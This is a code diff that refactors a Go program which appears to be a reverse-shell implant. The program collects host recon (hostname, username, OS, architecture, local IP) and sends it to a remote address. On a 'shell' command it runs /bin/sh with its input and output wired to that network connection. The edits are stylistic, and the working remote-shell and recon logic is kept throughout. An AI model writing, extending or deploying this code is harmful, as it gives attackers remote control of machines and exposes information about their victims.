@@ -22,21 +22,17 @@ type Recon struct {
 
 func gatherRecon() Recon {
 	hostname, _ := os.Hostname()
-
 	username := os.Getenv("USER")
 	if username == "" {
 		username = os.Getenv("LOGNAME")
 	}
-
-	ip := getLocalIP()
-
 	return Recon{
 		Hostname: hostname,
 		Username: username,
 		OS:       runtime.GOOS,
 		Arch:     runtime.GOARCH,
 		Kernel:   runtime.GOOS,
-		IP:       ip,
+		IP:       getLocalIP(),
 	}
 }
 
@@ -73,41 +69,40 @@ func main() {
 
 	fmt.Fprintf(os.Stderr, "connected to %s\n", *connectAddr)
 
-	// Send recon info
-	recon := gatherRecon()
-	reconJSON, _ := json.Marshal(recon)
-	fmt.Fprintf(conn, "%s\n", reconJSON)
-
-	// Wait for commands
+	encoder := json.NewEncoder(conn)
 	decoder := json.NewDecoder(conn)
+
+	// Send recon
+	if err := encoder.Encode(gatherRecon()); err != nil {
+		fmt.Fprintf(os.Stderr, "failed to send recon: %v\n", err)
+		return
+	}
+
+	// Command loop
 	for {
 		var msg struct {
 			Cmd string `json:"cmd"`
 		}
 		if err := decoder.Decode(&msg); err != nil {
 			fmt.Fprintf(os.Stderr, "connection lost: %v\n", err)
-			break
+			return
 		}
 
 		switch strings.TrimSpace(msg.Cmd) {
-		case "spawn_shell":
+		case "shell":
 			fmt.Fprintf(os.Stderr, "spawning shell...\n")
 			cmd := exec.Command("/bin/sh")
 			cmd.Stdin = conn
 			cmd.Stdout = conn
 			cmd.Stderr = conn
 
-			// Send ready signal
-			readyJSON, _ := json.Marshal(map[string]string{"status": "shell_ready"})
-			fmt.Fprintf(conn, "%s\n", readyJSON)
+			encoder.Encode(map[string]string{"status": "shell_ready"})
 
 			if err := cmd.Run(); err != nil {
 				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
 			}
 
-			// Shell ended, send notification
-			doneJSON, _ := json.Marshal(map[string]string{"status": "shell_done"})
-			fmt.Fprintf(conn, "%s\n", doneJSON)
+			encoder.Encode(map[string]string{"status": "shell_done"})
 
 		case "exit":
 			fmt.Fprintf(os.Stderr, "exiting...\n")
